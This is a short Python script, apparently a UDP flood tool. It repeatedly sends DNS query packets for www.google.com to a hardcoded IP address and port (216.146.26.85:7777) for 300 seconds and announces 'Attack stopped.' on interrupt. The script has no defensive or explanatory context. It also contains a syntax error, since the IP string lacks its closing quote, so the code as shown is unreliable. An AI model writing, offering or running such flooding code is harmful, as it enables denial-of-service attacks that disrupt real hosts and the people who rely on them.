import socket
import struct
import random
from time import time as tt

def DNS():
    ip = "216.146.26.85
    port = 7777
    time = 300

    data = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01'
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    addr = (str(ip),int(port))
    startup = tt()
    while True:

        endtime = tt()
        if (startup + time) < endtime:
            break

        s.sendto(data, addr)

if __name__ == '__main__':
    try:
           DNS()

    except KeyboardInterrupt:
        print("\033[32mAttack stopped.")